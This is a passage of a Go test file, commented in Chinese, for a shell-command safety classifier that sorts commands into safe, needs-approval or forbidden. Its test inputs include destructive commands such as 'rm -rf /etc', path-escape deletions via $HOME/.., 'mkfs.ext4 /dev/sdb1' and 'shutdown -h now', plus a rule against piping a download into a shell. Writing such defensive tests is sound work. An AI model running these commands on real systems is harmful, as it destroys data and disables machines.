		if got.Level != LevelForbidden || got.RuleID != "CURL_PIPE_SHELL" {
			t.Errorf("Classify(%q) = %q (%s), want forbidden CURL_PIPE_SHELL; reasons=%v", cmd, got.Level, got.RuleID, got.Reasons)
		}
	}

	// 对照：本地字面量内容喂 shell 不属于远程脚本（仍需审批，不禁止）。
	if got := Classify(`echo hello | bash`, OSLinux); got.Level != LevelNeedsApproval {
		t.Errorf("Classify(%q) = %q (%s), want needs_approval", `echo hello | bash`, got.Level, got.RuleID)
	}
	// 对照：进程替换里无下载命令时维持既有结果。
	if got := Classify(`cat <(ls) | bash`, OSLinux); got.Level != LevelNeedsApproval {
		t.Errorf("Classify(%q) = %q (%s), want needs_approval", `cat <(ls) | bash`, got.Level, got.RuleID)
	}
}

// TestOracleRedirectTargetNotCommandName 锁定 fuzz 检测器对重定向目标的
// 处理（fuzz 实测误报回归：FuzzClassify minimize 出 "cat</rm -rf"）：
// <、> 的目标 token 不是命令词，splitSegmentsLite 必须将其从词表丢弃，
// 否则 effectiveCommand 的 path.Base 会把 "cat</rm" 的目标 "/rm" 误提取
// 成命令名 "rm"，把无害的 cat 读文件命令误判为含 rm -rf。
func TestOracleRedirectTargetNotCommandName(t *testing.T) {
	// 无害形态：cat 读重定向目标文件，Classify 判 safe 是正确语义，
	// 检测器不得报危险。
	for _, cmd := range []string{
		"cat</rm -rf",
		"cat </bin/rm -rf",
		"cat 0< /rm",
		"cat < /rm -rf",
	} {
		got := Classify(cmd, OSLinux)
		if got.Level != LevelSafe {
			t.Errorf("Classify(%q) = %q (%s), want safe（cat 读重定向目标文件）", cmd, got.Level, got.RuleID)
		}
		if danger := dangerousCommand(got.Normalized); danger != "" {
			t.Errorf("dangerousCommand(%q) = %q, want empty（重定向目标不是命令词）", cmd, danger)
		}
	}

	// echo 带输出重定向是文件写入：Classify 判 needs_approval（FILE_WRITE）
	// 收紧，不进 safe 路径；但检测器同样不得把目标 x 误提取为命令名。
	if got := Classify("echo out>x", OSLinux); got.Level != LevelNeedsApproval || got.RuleID != "FILE_WRITE" {
		t.Errorf("Classify(%q) = %q (%s), want needs_approval FILE_WRITE", "echo out>x", got.Level, got.RuleID)
	}
	if danger := dangerousCommand("echo out>x"); danger != "" {
		t.Errorf("dangerousCommand(%q) = %q, want empty", "echo out>x", danger)
	}

	// 危险形态不受目标丢弃影响：真正的 rm -rf 仍必须命中检测器。
	for _, cmd := range []string{
		"rm -rf >/dev/null",
		"rm -rf 2>/dev/null",
		"rm -r -f >/dev/null",
	} {
		if danger := dangerousCommand(cmd); danger != "rm -rf" {
			t.Errorf("dangerousCommand(%q) = %q, want \"rm -rf\"（丢弃重定向目标不得漏检）", cmd, danger)
		}
		if d := Classify(cmd, OSLinux); d.Level != LevelForbidden {
			t.Errorf("Classify(%q) = %q (%s), want forbidden", cmd, d.Level, d.RuleID)
		}
	}
}

// TestClassifyRound2Fixes 锁定第二轮评审修复的行为回归。
func TestClassifyRound2Fixes(t *testing.T) {
	cases := []struct {
		name  string
		cmd   string
		level Level
		rule  string
	}{
		// #2 空命令替换：含 `` 的命令绝不能 safe（fail-closed；此前空替换
		// 经 classifyScript 静默返回，SAFE_READ 成为最高级别）。
		{"empty backtick after safe read", "sh -c ps ``", LevelNeedsApproval, "DEFAULT_ASK"},
		{"empty backtick standalone", "ls ``", LevelNeedsApproval, "DEFAULT_ASK"},
		// #4 动态路径删除：$HOME/~ 白名单变量加 .. 可逃逸到保护根，
		// 递归/强制删除按最坏情况 forbidden；普通删除保持审批。
		{"rm home escape etc", "rm -rf $HOME/../../etc", LevelForbidden, "RM_PROTECTED"},
		{"rm tilde escape etc", "rm -rf ~/../etc", LevelForbidden, "RM_PROTECTED"},
		{"rm tilde escape plain", "rm ~/../etc", LevelNeedsApproval, "RM_ANY"},
		{"rm home plain keeps approval", "rm -rf ~/tmp", LevelNeedsApproval, "RM_ANY"},
		// #5 复合结构段首词：then/time 等不得让段内危险命令落 DEFAULT_ASK。
		{"if then rm", "if true; then rm -rf /etc; fi", LevelForbidden, "RM_PROTECTED"},
		{"time rm", "time rm -rf /etc", LevelForbidden, "RM_PROTECTED"},
		{"then mkfs", "if true; then mkfs.ext4 /dev/sdb1; fi", LevelForbidden, "MKFS"},
		{"time ls stays safe", "time ls -la", LevelSafe, "SAFE_READ"},
		{"time shutdown", "time shutdown -h now", LevelForbidden, "POWER"},
		// #6 docker compose exec 与 docker exec 同等递归分类。
		{"compose exec shell rm", "docker compose exec svc sh -c 'rm -rf /etc'", LevelForbidden, "RM_PROTECTED"},
		// 四期 7.3D：exec（含 compose exec）无 -c 载荷 → CONTAINER_CHANGE。
		{"compose exec plain", "docker compose exec svc ls", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"compose ps stays safe", "docker compose ps", LevelSafe, "SAFE_SYSTEM_STATUS"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := Classify(tc.cmd, OSLinux)
			if got.Level != tc.level {
				t.Fatalf("Classify(%q).Level = %q (%s: %s), want %q; reasons=%v",
					tc.cmd, got.Level, got.RuleID, got.Reason, tc.level, got.Reasons)
			}
			if got.RuleID != tc.rule {
				t.Fatalf("Classify(%q).RuleID = %q, want %q; reasons=%v",
					tc.cmd, got.RuleID, tc.rule, got.Reasons)
			}
		})
	}
}

// TestIsAssignmentByteScan 锁定 isAssignment 手写扫描与原正则语义一致。
func TestIsAssignmentByteScan(t *testing.T) {
	yes := []string{"A=", "a1=", "_x=", "HOME=/dev/null", "HISTSIZE=0"}
	no := []string{"", "=", "1a=", "-x=", "a", "`id`", "ps", "$HOME="}
	for _, s := range yes {
		if !isAssignment(s) {
			t.Errorf("isAssignment(%q) = false, want true", s)
		}
	}
	for _, s := range no {
		if isAssignment(s) {
			t.Errorf("isAssignment(%q) = true, want false", s)
		}
	}
}
